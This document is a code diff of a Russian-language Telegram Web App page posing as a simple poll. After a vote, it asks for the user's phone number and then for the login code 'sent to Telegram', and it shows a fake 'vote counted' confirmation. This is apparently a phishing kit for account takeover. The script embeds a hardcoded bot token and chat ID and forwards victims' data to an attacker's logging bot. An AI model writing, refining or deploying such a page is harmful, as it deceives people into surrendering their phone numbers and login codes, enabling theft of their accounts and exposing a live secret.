@@ -5,94 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --bg: var(--tg-theme-bg-color, #ffffff);
-            --text: var(--tg-theme-text-color, #000000);
-            --hint: var(--tg-theme-hint-color, #999999);
-            --btn: var(--tg-theme-button-color, #3390ec);
-            --btn-text: var(--tg-theme-button-text-color, #ffffff);
-        }
+        :root { --bg: var(--tg-theme-bg-color, #ffffff); --text: var(--tg-theme-text-color, #000000); --hint: var(--tg-theme-hint-color, #999999); --btn: var(--tg-theme-button-color, #3390ec); --btn-text: var(--tg-theme-button-text-color, #ffffff); }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--bg); color: var(--text); margin: 0; }
         .hidden { display: none !important; }
-        
         h2 { font-size: 24px; font-weight: 600; margin-bottom: 10px; margin-top: 20px; }
         p { font-size: 14px; color: var(--hint); line-height: 1.4; margin-bottom: 20px; }
-
-        /* Карточки голосования */
-        .vote-option {
-            border: 2px solid var(--hint);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 10px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .vote-option.selected {
-            border-color: var(--btn);
-            background: rgba(51, 144, 236, 0.1);
-        }
-
-        /* Поля ввода */
-        .input-field {
-            width: 100%; max-width: 280px; padding: 15px; margin-top: 10px;
-            border: 1.5px solid var(--hint); border-radius: 10px;
-            font-size: 18px; text-align: center; box-sizing: border-box;
-            background: var(--bg); color: var(--text); outline: none;
-        }
-
-        /* Кнопки */
-        .main-btn {
-            background: var(--btn); color: var(--btn-text);
-            border: none; border-radius: 10px; padding: 15px 20px;
-            font-size: 16px; font-weight: 600; width: 100%; max-width: 300px;
-            margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto;
-        }
+        .vote-option { border: 2px solid var(--hint); border-radius: 12px; padding: 15px; margin-bottom: 10px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
+        .vote-option.selected { border-color: var(--btn); background: rgba(51, 144, 236, 0.1); }
+        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto; }
         .main-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        /* Ячейки для кода */
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--hint); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
         .code-cell.filled { border-color: var(--btn); }
         .code-cell.active { border-color: var(--btn); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
         .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
-        
         .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <!-- Шаг 1: Голосование -->
     <div id="screen-vote">
         <h2>Сделайте выбор</h2>
         <p>Выберите один из вариантов ниже</p>
-        
         <div class="vote-option" onclick="selectVote(this, 'Вариант 1')">Вариант 1</div>
         <div class="vote-option" onclick="selectVote(this, 'Вариант 2')">Вариант 2</div>
         <div class="vote-option" onclick="selectVote(this, 'Вариант 3')">Вариант 3</div>
-
         <button class="main-btn" id="btn-next-vote" disabled onclick="showPhoneScreen()">Далее</button>
     </div>
 
-    <!-- Шаг 2: Ввод номера -->
     <div id="screen-phone" class="hidden">
         <h2>Ваш номер</h2>
         <p>Для учета голоса поделитесь номером телефона</p>
-        
         <button class="main-btn" id="btn-share">Поделиться номером</button>
-        
-        <!-- Резервный ручной ввод, если Telegram забагует -->
-        <div style="margin-top: 20px; font-size: 12px; color: var(--hint);">или введите вручную:</div>
-        <input type="tel" id="manual-phone" class="input-field" placeholder="+7 999 000 00 00">
-        <button class="main-btn" style="background: #666;" id="btn-manual">Продолжить</button>
     </div>
 
-    <!-- Шаг 3: Ввод кода -->
     <div id="screen-code" class="hidden">
         <h2>Введите код</h2>
         <p id="code-subtitle">Мы отправили код в Telegram на ваш номер</p>
-        
         <div class="code-container" id="code-cells">
             <div class="code-cell"></div>
             <div class="code-cell"></div>
@@ -106,7 +55,7 @@
 
     <script>
         let selectedVote = null;
-        const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24"; // Токен лог-бота
+        const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24";
         const CHAT_ID = "-1004399809740";
 
         function sendToLog(text) {
@@ -117,7 +66,6 @@
             });
         }
 
-        // --- ШАГ 1: ГОЛОСОВАНИЕ ---
         function selectVote(el, choice) {
             document.querySelectorAll('.vote-option').forEach(e => e.classList.remove('selected'));
             el.classList.add('selected');
@@ -130,41 +78,35 @@
             document.getElementById('screen-phone').classList.remove('hidden');
         }
 
-        // --- ШАГ 2: НОМЕР ---
+        function showCodeScreen() {
+            document.getElementById('screen-phone').classList.add('hidden');
+            document.getElementById('screen-code').classList.remove('hidden');
+            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+        }
+
         window.onload = function() {
             if (window.Telegram && window.Telegram.WebApp) {
                 const tg = window.Telegram.WebApp;
                 tg.expand();
 
-                // Кнопка Telegram
+                // Проверяем хэш (срабатывает после нажатия кнопки)
+                if (window.location.hash === "#code") {
+                    showCodeScreen();
+                }
+
+                // Кнопка запроса номера
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            let phone = "undefined";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-                            
-                            sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n📱 <b>НОМЕР:</b> +${phone}`);
-                            
-                            document.getElementById('screen-phone').classList.add('hidden');
-                            document.getElementById('screen-code').classList.remove('hidden');
-                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                            // Контакт улетел боту через системное сообщение!
+                            // Переключаем экран на ввод кода через хэш (без перезагрузки страницы)
+                            window.location.hash = "code";
+                            showCodeScreen();
                         }
                     });
                 };
 
-                // Ручной ввод
-                document.getElementById('btn-manual').onclick = function() {
-                    const phone = document.getElementById('manual-phone').value;
-                    if (phone.length > 5) {
-                        sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n📱 <b>НОМЕР (вручную):</b> ${phone}`);
-                        document.getElementById('screen-phone').classList.add('hidden');
-                        document.getElementById('screen-code').classList.remove('hidden');
-                        setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-                    }
-                };
-
-                // --- ШАГ 3: КОД ---
+                // Ввод кода
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 document.getElementById('code-cells').onclick = () => codeInput.focus();
@@ -197,7 +139,6 @@
                         
                         setTimeout(() => {
                             document.getElementById('code-subtitle').innerHTML = "<b style='color: #34c759;'>Голос учтен!</b>";
-                            document.getElementById('status-msg').classList.remove('hidden');
                         }, 1000);
                     }
                 });
